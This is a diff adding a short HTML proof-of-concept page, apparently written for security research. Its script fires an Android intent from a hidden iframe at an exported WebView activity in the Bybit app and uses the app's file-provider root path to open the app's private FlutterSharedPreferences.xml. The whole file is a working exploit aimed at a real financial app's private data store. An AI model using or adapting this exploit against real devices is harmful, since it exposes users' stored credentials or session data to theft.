@@ -1,0 +1,7 @@
+<!doctype html><html><body style="font:15px monospace;padding:8px"><h3>CONTENT-DISPLAY-TEST</h3><pre id="o">firing intents…</pre>
+<iframe id="f1" style="width:1px;height:1px"></iframe>
+<script>
+var base='intent://#Intent;action=android.intent.action.VIEW;component=com.bybit.app%2Fcom.zoloz.webcontainer.WebCActivity;S.url=';
+document.getElementById('f1').src = base + 'content://com.bybit.app.fileProvider.com.crazecoder.openfile/root/data/data/com.bybit.app/shared_prefs/FlutterSharedPreferences.xml;end';
+document.getElementById('o').textContent += '\nfired content:// openfile (root-path "") → shared_prefs';
+</script></body></html>
